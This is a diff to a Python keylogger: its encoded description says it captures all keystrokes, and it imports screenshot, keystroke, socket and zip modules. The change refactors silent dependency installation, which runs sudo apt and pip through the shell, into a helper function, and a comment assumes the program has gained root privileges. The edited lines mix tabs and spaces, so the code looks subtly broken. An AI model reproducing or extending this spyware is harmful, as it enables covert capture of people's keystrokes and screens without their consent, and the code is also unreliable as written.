@@ -29,6 +29,7 @@ Description : dGhpcyBwcm9ncmFtIGNhcHR1cmVzIGFsbCBrZXlzdHJva2VzIHByZXNzZWQ
 					                  !
 ----------------------------------------------------------------------------------------------------
 '''
+
 # import module to zip files
 from zipfile import ZipFile
 # import module to run functions at specific times
@@ -39,6 +40,18 @@ import socket as sck
 import os, time
 # import subprocess to execute terminal commands
 import subprocess as subp
+
+'''
+install dependency if necessary
+'''
+def install_dependency(module_name):
+  # attempt to download python's packacke installer
+  subp.call('sudo apt install python-pip3', shell=True)
+  # downloading module
+  subp.call('pip install ' + module_name, shell=True)
+  # wait 30 seconds for download to complete
+  time.sleep(30)
+
 '''
 The following dependencies may not be installed by default
 so try importing them and if it fails attempt
@@ -50,27 +63,20 @@ and has aptly obtained root/admin privileges though as a proof
 of concept downloading these modules manually will do not harm
 '''
 try:
+  # module to take screenshot
 	import pyautogui as pygrab
 except:
-	# attempt to download python's packacke installer
-	subp.call('suodo apt install python-pip3', shell=True)
-	# downloading module
-	subp.call('pip install pyautogui', shell=True)
-	# wait 30 for download to complete
-	time.sleep(30)
-	# try importing module after attempting download
-	import pyautogui as pygrab
+  # attempt to install dependency
+  install_dependency('pyautogui')
+  # try importing module after attempting download
+  import pyautogui as pygrab
 try:
+  # module to capture keystrokes
 	from pynput import keyboard
 except:
-	# attempt to download python's packacke installer
-	subp.call('sudo apt install python-pip3', shell=True)
-	# downloading module
-	subp.call('pip install pynput', shell=True)
-	# wait 30 seconds for download to complete
-	time.sleep(30)
+  install_dependency('pynput')
 	# try importing module after attempting download
-	from pynput import keyboard
+  from pynput import keyboard
 	
 
 '''************************************************************'''
